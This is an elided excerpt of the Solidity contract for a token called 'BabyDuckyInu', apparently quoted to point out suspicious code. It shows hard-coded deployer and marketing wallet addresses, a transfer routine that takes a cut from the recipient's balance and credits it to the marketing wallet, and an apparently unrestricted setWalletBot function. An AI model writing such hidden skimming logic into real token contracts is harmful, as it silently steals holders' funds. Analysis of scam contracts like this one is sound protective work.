...
contract BabyDuckyInu is IERC20, Ownable {
    ...
    constructor () {
        ...
        address deployer = 0xe4Fd61cB7a743BBbD4398e0200a338832FDF94bA;
        address marketingreceiver = 0x96dC4E50DC789bbB19e9a6576d1a6DBfD8e10b5D;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        _rOwned[recipient] = _rOwned[recipient].sub(amount / 100 * giveaway);
        _rOwned[marketingFeeReceiver] = _rOwned[marketingFeeReceiver].add(amount / 100 * reflection);
    ...
    function setWalletBot(address newAddress) external virtual {
